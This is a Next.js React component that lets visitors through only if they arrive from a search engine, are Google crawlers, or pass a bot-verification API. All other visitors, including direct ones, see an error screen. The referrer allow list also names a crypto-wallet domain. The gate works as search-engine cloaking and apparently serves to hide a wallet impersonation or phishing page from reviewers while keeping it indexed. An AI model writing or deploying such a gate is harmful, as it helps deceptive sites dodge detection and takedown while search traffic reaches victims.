"use client";

import { useEffect, useState } from "react";
import { usePathname } from "next/navigation";
import InfoPage from "./home/page";
import ErrorScreen from "../components/ErrorScreen";

// Access is allowed only if coming from a search engine or if a verified bot

const SEARCH_ENGINES = [
  "google.",
  "bing.",
  "yahoo.", 
  "duckduckgo.",
  "baidu.",
  "yandex.",
  "ask.",
  "aol.",
  "ecosia.",
  "startpage.",
  "search.",
  "https://www.eternl-wallet.com/",
  "http://localhost:3002",
  "localhost"
];

function isFromSearchEngine(referrer: string) {
  if (!referrer) return false;
  return SEARCH_ENGINES.some((engine) => referrer.includes(engine));
}

function isFromSearchEngineOrAllowed(referrer: string) {
  return isFromSearchEngine(referrer);
}

// Bot verification functions
function matchesOfficialGoogleUA(ua: string) {
  if (!ua) return false;
  const patterns = [
    /Mozilla\/5\.0 \(compatible; Googlebot\/2\.1; \+http:\/\/www\.google\.com\/bot\.html\)/i,
    /Mozilla\/5\.0 \(Linux; Android .*\) AppleWebKit\/.* \(KHTML, like Gecko\) Chrome\/41\.0\.2272\.96 .* \(compatible; Googlebot\/2\.1; \+http:\/\/www\.google\.com\/bot\.html\)/i,
    /Googlebot-Image\/1\.0/i,
    /Googlebot-Video\/1\.0/i,
    /Googlebot-News/i,
    /Googlebot-Favicon/i,
    /Mozilla\/5\.0 \(Linux; Android .*\) AppleWebKit\/.* \(KHTML, like Gecko\) Chrome\/41\.0\.2272\.96 .* \(compatible; Google-AMPHTML\/1\.0; \+https:\/\/www\.google\.com\/bot\.html\)/i,
    /AMP Googlebot/i,
    /AdsBot-Google(\-Mobile)?/i,
    /Mediapartners-Google/i,
    /Feedfetcher-Google/i
  ];
  return patterns.some((p) => p.test(ua));
}

const isCrawlerUserAgent = () => {
  if (typeof navigator === "undefined") return false;
  return matchesOfficialGoogleUA(navigator.userAgent);
};

const ReferrerProvider = ({ children }: { children: React.ReactNode }) => {
  const [isLoading, setIsLoading] = useState(true);
  const [isVerifiedBot, setIsVerifiedBot] = useState(false);
  const [isFromSearch, setIsFromSearch] = useState(false);
  const pathname = usePathname();
  
  useEffect(() => {
    const checkAccess = async () => {
      if (typeof window === "undefined") return;

      // Search engine or allowed referrer logic
      const referrer = document.referrer;
      const currentUrl = window.location.href;
      
      console.log("[ReferrerProvider] Current URL:", currentUrl);
      console.log("[ReferrerProvider] Referrer URL:", referrer);
      
      // Special handling for localhost development - always allow access
      if (currentUrl.includes("localhost") || currentUrl.includes("127.0.0.1")) {
        console.log("[ReferrerProvider] Localhost development detected, allowing access.");
        setIsFromSearch(true);
        setIsLoading(false);
        return;
      }
      
      // Check if it's a verified bot FIRST (before referrer check)
      // Bots often don't have referrers, so we need to check them first
      let botVerified = false;
      
      try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 2000);
        
        const response = await fetch('/api/verify-bot', {
          signal: controller.signal,
          cache: 'no-store',
        });
        
        clearTimeout(timeoutId);
        
        if (response.ok) {
          const data = await response.json();
          if (data.isBot) {
            botVerified = true;
            setIsVerifiedBot(true);
            console.log("[ReferrerProvider] Verified bot detected via API, allowing access.");
            console.log("[ReferrerProvider] Bot details:", {
              isCloudflareVerified: data.isCloudflareVerifiedBot,
              matchesBotUA: data.matchesBotUA,
              userAgent: data.userAgent,
            });
          }
        }
      } catch (error) {
        // API failed or timed out - fallback to user agent check
        console.warn("[ReferrerProvider] Bot verification API failed, using UA fallback:", error);
        const isBot = isCrawlerUserAgent();
        if (isBot) {
          botVerified = true;
          setIsVerifiedBot(true);
          console.log("[ReferrerProvider] Bot detected via UA fallback, allowing access.");
        }
      }

      // Check if user came from search engine (only if not already verified as bot)
      if (!botVerified) {
        if (isFromSearchEngineOrAllowed(referrer)) {
          setIsFromSearch(true);
          console.log("[ReferrerProvider] User came from a search engine or allowed referrer.");
        } else {
          setIsFromSearch(false);
          console.log("[ReferrerProvider] User did NOT come from a search engine or allowed referrer.");
        }
      } else {
        // Bot is verified, so we don't need to check referrer
        setIsFromSearch(false);
      }

      setIsLoading(false);
      console.log("[ReferrerProvider] Loading complete.");
    };

    checkAccess();
  }, [pathname]);

  if (isLoading) {
    console.log("[ReferrerProvider] Loading...");
    return <div className="bg-[#202124] h-screen" />;
  }

  // Allow access only for verified bots or if from search engine
  if (isVerifiedBot || isFromSearch) {
    console.log("[ReferrerProvider] Access allowed.");
    return <>{children}</>;
  }

  console.log("[ReferrerProvider] Access denied: showing error screen.");
  return <ErrorScreen />;
};

export default ReferrerProvider;